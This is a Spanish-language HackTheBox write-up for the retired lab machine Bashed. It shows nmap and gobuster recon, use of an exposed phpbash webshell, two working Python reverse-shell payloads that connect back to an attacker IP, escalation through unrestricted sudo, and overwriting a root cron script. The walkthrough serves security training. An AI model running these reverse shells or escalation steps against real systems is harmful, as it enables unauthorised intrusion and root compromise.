---
title: 'Bashed - HackTheBox'
description: 'Writeup de la máquina Bashed de HackTheBox, una máquina Linux fácil con una webshell phpbash expuesta. Escalada de privilegios mediante sudo y cron job de root.'
pubDate: 2026-03-07
platform: 'htb'
category: 'machines'
difficulty: 'easy'
os: 'linux'
language: es
tags: ['phpbash', 'webshell', 'sudo', 'cron', 'python', 'linux']
retired: true
heroImage: '/images/writeups/hackthebox/bashed/card.png'
attackVectors: ['web']
techniques: ['T1190', 'T1059.006', 'T1053.003', 'T1548.003']
vulnerabilities: ['exposed-webshell', 'sudo-misconfiguration']
certifications: ['OSCP', 'eJPT']
skillLevel: 'beginner'
estimatedTime: '1 hora'
points: 20
rating: 4.2
---

# Bashed - HackTheBox Writeup

**Dificultad**: Easy
**OS**: Linux
**Plataforma**: HackTheBox
**IP**: 10.10.10.68
**Estado**: Retirada ✓

## Introducción

Bashed es una máquina Linux fácil que presenta el proyecto **phpbash** (una webshell PHP) olvidado en el servidor web. El desarrollador lo usó para desarrollo local, pero lo dejó expuesto en producción. Desde ahí podemos escalar privilegios usando `sudo` para ejecutar comandos como otro usuario y luego aprovechamos un cron job de root para obtener shell completa.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.68 -oG allPorts
```

**Puerto descubierto:**

- 80/tcp - HTTP

### Escaneo de servicios

```bash
nmap -p80 -sCV 10.10.10.68 -oN targeted
```

```
80/tcp open  http  Apache httpd 2.4.18
```

## Enumeración Web

### Fuzzing de directorios

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

**Directorios encontrados:**

```
/images         (Status: 301)
/uploads        (Status: 301)
/php            (Status: 301)
/css            (Status: 301)
/dev            (Status: 301)   <-- interesante
/js             (Status: 301)
/fonts          (Status: 301)
```

### Directorio /dev

Accedemos a `http://10.10.10.68/dev/` y encontramos un listado de archivos:

```
phpbash.min.php
phpbash.php
```

## Explotación

### Acceso via phpbash

Navegamos a `http://10.10.10.68/dev/phpbash.php` y obtenemos una **webshell interactiva** directamente en el navegador.

```
www-data@bashed:/var/www/html/dev#
```

### Obtener reverse shell

Desde la webshell, generamos una reverse shell Python más cómoda:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Listener previo:

```bash
nc -lvnp 4444
```

### User flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/arrexel/user.txt
```

## Escalada de Privilegios

### Sudo como scriptmanager

Comprobamos los permisos sudo del usuario `www-data`:

```bash
sudo -l
```

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Podemos ejecutar cualquier comando como `scriptmanager` sin contraseña:

```bash
sudo -u scriptmanager bash -i
```

**Shell como scriptmanager obtenida.**

### Análisis del directorio /scripts

```bash
ls -la /scripts/
```

```
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root           12 Jun 14 12:31 test.txt
```

El archivo `test.txt` es propiedad de **root** pero se regenera constantemente. Esto indica que existe un **cron job de root** que ejecuta `test.py`.

```bash
cat /scripts/test.py
```

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

### Inyectar payload en test.py

Modificamos `test.py` para que ejecute una reverse shell como root:

```bash
cat > /scripts/test.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.10",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
EOF
```

Listener en nuestra máquina:

```bash
nc -lvnp 5555
```

Esperamos a que el cron job se ejecute (menos de 1 minuto):

```bash
root@bashed:/scripts# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root flag

```bash
cat /root/root.txt
```

## Conclusión

Bashed ilustra perfectamente el riesgo de dejar herramientas de desarrollo en servidores de producción. Las lecciones principales:

- Nunca dejar webshells o herramientas de debug en producción
- Los permisos `sudo NOPASSWD` sin restricciones suponen una escalada trivial
- Los cron jobs de root que ejecutan scripts editables por otros usuarios son una vía crítica de escalada

| Paso               | Técnica                      |
| ------------------ | ---------------------------- |
| Acceso inicial     | Webshell phpbash expuesta    |
| Movimiento lateral | `sudo -u scriptmanager`      |
| Escalada a root    | Cron job con script editable |

## Recursos

- [phpbash - GitHub](https://github.com/Arrexel/phpbash)
- [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/)
